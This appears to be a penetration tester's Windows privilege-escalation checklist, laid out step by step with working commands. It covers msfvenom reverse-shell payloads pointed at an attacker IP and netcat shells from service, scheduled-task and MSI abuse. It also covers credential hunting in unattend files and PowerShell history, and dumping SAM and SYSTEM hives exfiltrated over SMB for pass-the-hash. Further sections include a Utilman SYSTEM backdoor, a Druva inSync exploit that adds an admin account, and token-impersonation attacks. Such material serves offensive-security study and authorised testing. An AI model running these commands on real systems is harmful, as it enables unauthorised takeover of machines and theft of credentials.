# Windows Privilege Escalation Methodology

Use this checklist when you have a shell on a Windows host and need to escalate privileges. Work top-to-bottom — credential hunting is fastest and most reliable; service/token abuse is more technical but broadly applicable.

---

## 0. Situational Awareness (Always First)

```cmd
whoami
whoami /priv
whoami /groups
net user
net localgroup administrators
systeminfo
hostname
```

---

## 1. Automated Enumeration (Run Early, Review in Background)

Run one or more of these while manually checking other vectors.

```cmd
:: WinPEAS — redirect output or it scrolls too fast to read
winpeas.exe > winpeas_out.txt

:: PrivescCheck (PowerShell, no binary needed)
Set-ExecutionPolicy Bypass -Scope process -Force
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```

**WES-NG** (run from attacker machine against `systeminfo` output):
```cmd
:: On target:
systeminfo > systeminfo.txt
:: Transfer systeminfo.txt to attacker, then:
wes.py systeminfo.txt
```

**Metasploit** (if you have a Meterpreter shell):
```
use multi/recon/local_exploit_suggester
```

---

## 2. Credential Hunting

### Unattended Installation Files
Check these paths for plaintext credentials left by Windows Deployment Services:
```cmd
type C:\Unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\system32\sysprep.inf
type C:\Windows\system32\sysprep\sysprep.xml
```
Look for `<Password>` blocks inside `<Credentials>` sections.

### PowerShell History
```cmd
:: From cmd.exe:
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

:: From PowerShell:
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Saved Windows Credentials
```cmd
cmdkey /list
:: If creds are listed, use them:
runas /savecred /user:<username> cmd.exe
```

### IIS web.config (database connection strings)
```cmd
type C:\inetpub\wwwroot\web.config | findstr connectionString
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### PuTTY Saved Proxy Credentials
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### Installed Software (look for known CVEs)
```cmd
wmic product get name,version,vendor
```
Cross-reference versions on exploit-db / Google. Also check desktop shortcuts and running services for software not listed here.

---

## 3. Windows Services

### Step 1 — List and inspect services
```cmd
sc qc <servicename>
:: Key fields: BINARY_PATH_NAME (executable), SERVICE_START_NAME (run-as user)
```

### Step 2 — Check service executable permissions (Insecure Service Executable)
```cmd
icacls <path\to\service.exe>
```
If `Everyone:(M)` or `BUILTIN\Users:(M/F)` → you can overwrite the binary.

**Exploit:**
```bash
# Attacker — generate payload and serve it
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4445 -f exe-service -o rev-svc.exe
python3 -m http.server 8000
nc -lvp 4445
```
```powershell
# Target — download, replace, restart
wget http://<ATTACKER_IP>:8000/rev-svc.exe -O rev-svc.exe
move <original.exe> <original.exe.bkp>
move rev-svc.exe <original.exe>
icacls <original.exe> /grant Everyone:F
sc stop <servicename>
sc start <servicename>
```
> Note: Use `sc.exe` not `sc` in PowerShell (sc is aliased to Set-Content).

### Step 3 — Check for Unquoted Service Paths
```cmd
sc qc <servicename>
:: Look for BINARY_PATH_NAME with spaces and no quotes, e.g.:
:: C:\My Programs\Some Service\bin\service.exe
```
Windows will try each space-split prefix as an executable. If you can write to any parent directory, drop your payload there.

**Find writable directories in the path:**
```cmd
icacls "C:\My Programs"
:: BUILTIN\Users: (AD)(WD) means you can create files/subdirectories
```

**Exploit:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4446 -f exe-service -o rev-svc2.exe
nc -lvp 4446
```
```cmd
move rev-svc2.exe C:\My Programs\Some.exe
icacls C:\My Programs\Some.exe /grant Everyone:F
sc stop <servicename>
sc start <servicename>
```

### Step 4 — Check Service DACL (Insecure Service Permissions)
Even if the executable is protected and the path is quoted, the service DACL itself may allow reconfiguration.
```cmd
:: Requires accesschk (Sysinternals — often at C:\tools\)
accesschk64.exe -qlc <servicename>
:: Look for: BUILTIN\Users: SERVICE_ALL_ACCESS
```

**Exploit — reconfigure to run your payload as SYSTEM:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4447 -f exe-service -o rev-svc3.exe
nc -lvp 4447
```
```cmd
icacls C:\Users\<user>\rev-svc3.exe /grant Everyone:F
sc config <servicename> binPath= "C:\Users\<user>\rev-svc3.exe" obj= LocalSystem
sc stop <servicename>
sc start <servicename>
```

---

## 4. Scheduled Tasks

```cmd
:: List all scheduled tasks with full detail
schtasks /query /fo list /v

:: Inspect a specific task
schtasks /query /tn <taskname> /fo list /v
:: Key fields: "Task to Run" (executable), "Run As User"
```

Check if you can write to the task's executable:
```cmd
icacls <path\to\task.bat>
:: BUILTIN\Users:(F) → overwrite it
```

**Exploit:**
```cmd
echo c:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> 4444 > C:\tasks\schtask.bat
:: Then wait for the task to trigger, or if you have permission:
schtasks /run /tn <taskname>
```

---

## 5. AlwaysInstallElevated

Check both registry keys — **both must be set** for this to work:
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploit:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o malicious.msi
```
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

---

## 6. Token / Privilege Abuse

Check current privileges:
```cmd
whoami /priv
```

### SeBackupPrivilege / SeRestorePrivilege
Allows reading any file regardless of DACL. Dump SAM + SYSTEM hives:
```cmd
reg save hklm\system C:\Users\<user>\system.hive
reg save hklm\sam C:\Users\<user>\sam.hive
```

Exfil via SMB (attacker side):
```bash
mkdir share
python3 /opt/impacket/examples/smbserver.py -smb2support -username <user> -password <pass> public share
```
```cmd
copy C:\Users\<user>\sam.hive \\<ATTACKER_IP>\public\
copy C:\Users\<user>\system.hive \\<ATTACKER_IP>\public\
```

Extract hashes and PTH:
```bash
secretsdump.py -sam sam.hive -system system.hive LOCAL
psexec.py -hashes <lmhash>:<nthash> administrator@<TARGET_IP>
```

### SeTakeOwnershipPrivilege
Take ownership of any file (e.g. utilman.exe for lock screen SYSTEM shell):
```cmd
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant <username>:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
:: Lock screen → click "Ease of Access" → get SYSTEM cmd
```

### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
Common on IIS app pool accounts (`iis apppool\defaultapppool`), LOCAL SERVICE, NETWORK SERVICE.

**RogueWinRM exploit** (if WinRM is not running on port 5985):
```bash
nc -lvp 4442
```
```cmd
:: Trigger from web shell or existing session:
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <ATTACKER_IP> 4442"
```
Also consider: **PrintSpoofer**, **GodPotato**, **JuicyPotato** (see Potatoes reference).

---

## 7. Unpatched Software / CVEs

```cmd
wmic product get name,version,vendor
systeminfo
```
- Search versions on exploit-db, Packet Storm, Google
- Run WES-NG against `systeminfo` output for missing patches
- Check for locally-bound RPC/service ports: `netstat -ano` → look for 127.0.0.1 listeners

**Example — Druva inSync 6.6.3 (RPC on port 6064, SYSTEM):**
```powershell
$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
$s = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Stream,[System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect("127.0.0.1", 6064)
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd")
$length = [System.BitConverter]::GetBytes($command.Length)
$s.Send($header); $s.Send($rpcType); $s.Send($length); $s.Send($command)
```

---

## Quick icacls Permission Reference

| Flag | Meaning |
|------|---------|
| F    | Full control |
| M    | Modify |
| RX   | Read & execute |
| R    | Read only |
| W    | Write only |
| AD   | Add subdirectory |
| WD   | Write data / add file |
| (I)  | Inherited |
| (OI) | Object inherit |
| (CI) | Container inherit |

---

## Key Windows Account Privilege Levels

| Account | Level |
|---------|-------|
| SYSTEM / LocalSystem | Highest — above Administrator |
| Administrators | Full admin |
| Standard Users | Limited |
| Local Service | Minimum privs, anonymous network |
| Network Service | Minimum privs, machine creds on network |

---

## References

- PayloadsAllTheThings — Windows Privilege Escalation
- Priv2Admin — Abusing Windows Privileges (github)
- HackTricks — Windows Local Privilege Escalation
- Potatoes (JuicyPotato, PrintSpoofer, GodPotato)
- RogueWinRM exploit
